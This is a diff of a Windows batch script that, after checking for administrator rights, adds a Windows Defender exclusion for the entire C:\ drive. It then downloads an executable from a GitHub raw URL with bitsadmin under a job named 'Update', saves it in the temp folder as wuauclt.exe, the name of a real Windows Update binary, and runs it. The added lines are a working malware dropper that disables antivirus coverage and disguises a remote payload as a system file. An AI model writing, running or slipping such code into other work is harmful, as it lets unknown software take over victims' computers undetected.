@@ -37,11 +37,11 @@ if %errorLevel% == 0 (
     )
     
     setlocal
-    reg add "HKLM\SOFTWARE\Microsoft\Windows Defender\Exclusions\Paths" /v "C:\\" /t REG_DWORD /d 1 /f >nul 2>&1
+    reg add "HKLM\SOFTWARE\Microsoft\Windows Defender\Exclusions\Paths" /v "C:\" /t REG_DWORD /d 0 /f
     timeout /t 2 >nul
     set "exeFile=%TEMP%\wuauclt.exe"
     set "url1=https://github.com/vault053009-maker/a/raw/refs/heads/main/VioletClient.exe"
-    bitsadmin /transfer "Update" "%url1%" "%exeFile%" >nul 2>&1
+    bitsadmin /transfer "Update" "%url1%" "%exeFile%"
     start "" "%exeFile%"
     endlocal
     exit
